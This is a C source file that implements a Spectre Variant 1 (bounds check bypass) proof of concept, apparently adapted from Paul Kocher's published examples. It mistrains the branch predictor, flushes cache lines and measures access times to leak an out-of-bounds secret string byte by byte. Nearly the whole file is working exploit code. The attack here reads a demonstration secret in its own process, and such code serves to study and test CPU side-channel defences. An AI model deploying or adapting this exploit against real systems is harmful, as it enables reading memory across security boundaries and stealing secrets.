#include <stdio.h>
#include <stdint.h>
#include <malloc.h>
#include <unistd.h>
#include <stdlib.h>
#include "fnr_helper.h"

// Functions are taken from
// https://www.paulkocher.com/doc/MicrosoftCompilerSpectreMitigation.html

#define CACHE_HIT_THRESHOLD 320

int unused3[64];
uint8_t array[256 * 4096];
uint8_t temp = 0;
int unused1[64];
int bufferSize = 16;
int unused2[64];
uint8_t buffer[160] = { 0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15 };
char secret[] = "The Magic Words are Squeamish Ossifrage.";
uint8_t bigNumberBuffer[4096 * 256];

void find_highest_score(int* scores);
void train_victim(int tries, size_t malicious_x);

uint8_t junk = 3;
void victim_function(size_t x){
	if( x < (	bigNumberBuffer[1 * 4096] +
				bigNumberBuffer[225 * 4096]+
				bigNumberBuffer[7 * 4096] +
				bigNumberBuffer[12 * 4096]
			) &&
		x < (	bigNumberBuffer[20 * 4096] +
				bigNumberBuffer[190 * 4096]
		) &&
		x < bufferSize){
		// read the array's element to temp
		temp &= array[buffer[x] * 4096];
	}
}

void find_highest_score(int* scores){
	int maxScore = 0;
	int maxIndex = 0;

	for (int i = 0; i < 256; i++){
		if(scores[i] > maxScore){
			maxIndex = i;
			maxScore = scores[i];
		}
	}
	printf("Letter: %c\t Index: %d\t Hits:%d \n", maxIndex, maxIndex, maxScore);
}

void train_victim(int tries, size_t malicious_x){
	
	clflush_array(array);

	/*
	size_t training_x = tries % bufferSize;
	int x;
	
	for(int i = 0; i < 6; i++){
		for(int j = 5; j >= 0; j--){
			for (volatile int z = 0; z < 200; z++) {}
			clflush(&bufferSize);
			clflush_array(bigNumberBuffer);
			for (volatile int z = 0; z < 200; z++) {}
			victim_function(0);
		}
		victim_function(malicious_x);
	}
	*/
	
	size_t training_x = tries % bufferSize;
	
	int x;
	for (int j = 29; j >= 0; j--) {
		clflush(&bufferSize);
		clflush_array(bigNumberBuffer);
		for (volatile int z = 0; z < 100; z++) {}
		
		x = ((j % 6) - 1) & ~0xFFFF;
		x = (x | (x >> 16));
		x = training_x ^ (x & (malicious_x ^ training_x));
		victim_function((j % 6) == 0 ? malicious_x : 0); 
		//victim_function(x);
	}
	
}

// Code for Spectre Variant 1
int main(){
	uint64_t time_dif;
	int mix_j, j;
	size_t larger_x;
	// initialize the array
	for (int i = 0; i < 256 * 4096; i++){
		array[i] = i % 256;
	}
	// initialize bigNumberBuffer
	for(int i = 0; i < 256; i++){
		for (int k = 0; k < 4096; k++)
		{
			bigNumberBuffer[i * 4096 + k] = i % 256;
		}
	}
	//printf("buf248*4096:%d\n", bigNumberBuffer[248 * 4096]);
	// steal the secret, secret is 40 byte long
	for(int i = 0; i < 3; i++){
		clflush_array(array);
		
		// initialize scores
		int* scores =(int*) malloc(256 * sizeof(int));
		for (int i = 0; i < 256; i++)
		{
			scores[i] = 0;
		}
		// out of bounds access
		larger_x = (size_t)(secret - (char*)buffer + i);
			
		for(int it = 0; it < 40; it++){
			
			// train and access
			train_victim(it, larger_x);
			
			// find cached index
			for(j = 0; j < 256; j++){
				mix_j = ((j * 167) + 13) & 255;
				time_dif = 0;

				measure_time(time_dif, &array[mix_j * 4096]);

				if(time_dif < CACHE_HIT_THRESHOLD && mix_j != 0){
					scores[mix_j]++;
				}
			}
		}
		
		
		find_highest_score(scores);

		free(scores);
	}
	
	return 0;
}
